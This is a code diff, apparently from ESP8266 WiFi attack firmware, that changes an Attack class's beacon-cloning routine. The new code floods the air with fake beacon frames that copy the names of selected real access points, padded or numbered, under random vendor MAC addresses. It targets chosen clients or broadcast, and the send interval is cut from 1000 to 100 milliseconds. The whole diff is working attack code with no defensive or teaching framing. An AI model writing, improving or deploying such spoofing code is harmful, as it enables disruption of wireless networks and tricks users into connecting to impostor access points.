@@ -5,12 +5,12 @@ Attack::Attack(){
 }
 
 void Attack::generate(){
-  Attack::stopAll();
   if(debug) Serial.print("generating Macs");
   
   Mac _randomBeaconMac;
   uint8_t _randomMacBuffer[6];
-  
+  beaconAdrs._clear();
+
   do{
     getRandomVendorMac(_randomMacBuffer);
     for(int i=0;i<6;i++) _randomBeaconMac.setAt(_randomMacBuffer[i],i);
@@ -143,42 +143,64 @@ void Attack::run(){
     if(debug) Serial.println(" done ");
   }
 
-  if(isRunning[1] && currentMillis-prevTime[1] >= 1000){
+  if(isRunning[1] && currentMillis-prevTime[1] >= 100){
     if(debug) Serial.print("running "+(String)attackNames[1]+" attack");
 
     for(int a=0;a<apScan.results;a++){
       if(apScan.isSelected(a)){
         String _ssid = apScan.getAPName(a);
+        int _ssidLen = _ssid.length();
+        int _restSSIDLen = 32 - _ssidLen;
         int _ch = apScan.getAPChannel(a);
+
+        Mac _broadcast;
+        _broadcast.set(0xFF,0xFF,0xFF,0xFF,0xFF,0xFF);
 
         wifi_set_channel(_ch);
 
         int _selectedClients = 0;
-        for(int i=0;i<clientScan.results;i++){
-          if(clientScan.getClientSelected(i)){
-            _selectedClients++;
 
-            buildBeacon(beaconAdrs._get(0),clientScan.getClientMac(i),_ssid+" 2",_ch,false);
-            for(int h=0;h<packetRate;h++) if(send()) packetsCounter[1]++;
-            
+        for(int c=0;c<macListLen;c++){
+          String _apName = _ssid;
+              
+          if(c < _restSSIDLen) for(int d=0; d < _restSSIDLen-c; d++) _apName += " ";//e.g. "SAMPLEAP           "
+          else if(c < _restSSIDLen*2){
+            _apName = "."+_apName;
+            for(int d=0;d<(_restSSIDLen-1)-c/2;d++) _apName += " ";//e.g. ".SAMPLEAP   "
+          } else{
+            for(int d=0; d < _restSSIDLen-2; d++) _apName += " ";
+            _apName += (String)c;//e.g. "SAMPLEAP        78"
           }
+
+          //build a broadcast packet for this AP & SSID
+          buildBeacon(beaconAdrs._get(c),_broadcast,_apName,_ch,apScan.getAPEncryption(a) != "none");
+
+          for(int b=0;b<clientScan.results;b++){
+            if(clientScan.getClientSelected(b)){
+              _selectedClients++;
+
+              //change packet to adress only the selected client
+              for(int i=0;i<6;i++) packet[4+i] = clientScan.getClientMac(b)._get(i);
+              
+              if(send()) packetsCounter[1]++;
+            }
+          }
+
+          //if no clients are selected send the broadcast packet
+          if(_selectedClients == 0) if(send()) packetsCounter[1]++;
         }
         
-        if(_selectedClients == 0){
-          Mac _client;
-          _client.set(0xFF,0xFF,0xFF,0xFF,0xFF,0xFF);
-
-          buildBeacon(beaconAdrs._get(0),_client,_ssid+" 2",_ch,false);
-          for(int h=0;h<packetRate;h++) if(send()) packetsCounter[1]++;
-
-        }
-        
-      } 
+      }
     }
     
     prevTime[1] = millis();
-    stati[1] = (String)packetsCounter[1]+"pkts/s";
+    stati[1] = (String)(packetsCounter[1]*10)+"pkts/s";
     packetsCounter[1] = 0;
+    macListChangeCounter++;
+    if(macListChangeCounter*10 >= macListInterval){
+      generate();
+      macListChangeCounter = 0;
+    }
     if(debug) Serial.println(" done ");
   }
 
@@ -203,12 +225,10 @@ void Attack::start(int num){
 }
 
 void Attack::stop(int num){
-  if(isRunning[num]){
-    isRunning[num] = false;
-    stati[num] = "ready";
-    prevTime[num] = millis();
-    if(debug) Serial.println("stopping "+(String)attackNames[num]+" attack");
-  }
+  if(isRunning[num] && debug) Serial.println("stopping "+(String)attackNames[num]+" attack");
+  isRunning[num] = false;
+  stati[num] = "ready";
+  prevTime[num] = millis();
 }
 
 void Attack::stopAll(){
